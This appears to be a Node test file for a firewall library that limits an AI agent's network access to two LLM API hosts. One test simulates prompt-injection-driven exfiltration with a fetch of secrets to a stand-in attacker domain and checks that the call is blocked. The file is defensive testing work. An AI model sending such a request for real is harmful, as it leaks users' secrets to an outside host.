/**
 * Basic example: a tool-using agent restricted to two LLM API hosts.
 * Anything else gets blocked with a PolicyViolation.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';

import { firewall, policy, PolicyViolation } from '../src/index.js';

const tightPolicy = policy({
  network: {
    allow: ['api.openai.com', 'api.anthropic.com'],
    methods: ['GET', 'POST'],
  },
  violations: 'throw',
});

test('agent stays on its allowed hosts', async () => {
  // Stub fetch so we don't hit real APIs in the test
  const original = globalThis.fetch;
  globalThis.fetch = async (url) => new Response(`stub:${url}`, { status: 200 });
  try {
    await firewall(tightPolicy, async () => {
      const r = await fetch('https://api.openai.com/v1/chat');
      assert.equal(r.status, 200);
    });
  } finally {
    globalThis.fetch = original;
  }
});

test('agent attempting an unauthorized fetch is blocked', async () => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => new Response('SHOULD NOT REACH', { status: 200 });
  try {
    await assert.rejects(
      () =>
        firewall(tightPolicy, async () => {
          // simulate prompt-injection-driven exfiltration to attacker domain
          await fetch('https://evil.attacker.example/leak?data=secrets');
        }),
      (err) =>
        err instanceof PolicyViolation &&
        err.reason === 'not_in_allowlist' &&
        err.url.includes('evil.attacker.example')
    );
  } finally {
    globalThis.fetch = original;
  }
});
